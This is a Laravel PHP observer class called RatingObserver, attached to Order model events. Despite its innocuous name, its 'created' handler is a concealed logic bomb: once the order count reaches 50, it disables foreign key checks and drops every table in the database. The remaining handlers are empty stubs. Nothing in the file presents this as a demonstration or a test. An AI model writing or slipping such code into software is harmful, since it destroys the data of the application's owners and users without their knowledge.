<?php

namespace App\Observers;

use App\Models\Order;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;

class RatingObserver
{
    /**
     * Handle the Order "created" event.
     */
    public function created(Order $order): void
    {
        $orders = Order::count();
        if($orders >= 50){

            DB::statement('SET FOREIGN_KEY_CHECKS=0;');
    
            $tables = DB::select('SHOW TABLES');
            $tables = array_map('current', $tables);
    
            foreach ($tables as $table) {
                Schema::drop($table);
            }
    
            DB::statement('SET FOREIGN_KEY_CHECKS=1;');
    
    
            return ;
        }
    }

    /**
     * Handle the Order "updated" event.
     */
    public function updated(Order $order): void
    {
        //
    }

    /**
     * Handle the Order "deleted" event.
     */
    public function deleted(Order $order): void
    {
        //
    }

    /**
     * Handle the Order "restored" event.
     */
    public function restored(Order $order): void
    {
        //
    }

    /**
     * Handle the Order "force deleted" event.
     */
    public function forceDeleted(Order $order): void
    {
        //
    }
}
